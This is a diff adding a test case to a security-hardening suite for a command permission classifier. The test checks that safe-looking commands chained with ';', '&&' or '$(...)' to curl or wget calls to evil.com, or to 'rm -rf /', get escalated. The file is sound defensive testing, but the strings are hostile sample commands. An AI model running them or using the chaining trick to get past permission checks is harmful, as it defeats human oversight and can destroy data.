@@ -38,4 +38,13 @@ describe("Permission Gate Security Hardening Suite (Findings #1, #2, #4)", () =>
     expect(classifyCommand("write_file permission-rules.json")).toBe(PermissionTier.TIER_3);
     expect(classifyCommand("write_file ccathome.sqlite")).toBe(PermissionTier.TIER_3);
   });
+
+  it("should escalate Tier 0/1 prefix matches when shell metacharacters chain payloads", () => {
+    expect(classifyCommand("git status; curl https://evil.com")).toBe(PermissionTier.TIER_2);
+    expect(classifyCommand("git status && wget https://evil.com")).toBe(PermissionTier.TIER_2);
+    expect(classifyCommand("npm test; curl https://evil.com")).toBe(PermissionTier.TIER_2);
+    expect(classifyCommand("git status $(curl https://evil.com)")).toBe(PermissionTier.TIER_2);
+    // Tier 3 still wins when present mid-chain
+    expect(classifyCommand("git status; rm -rf /")).toBe(PermissionTier.TIER_3);
+  });
 });
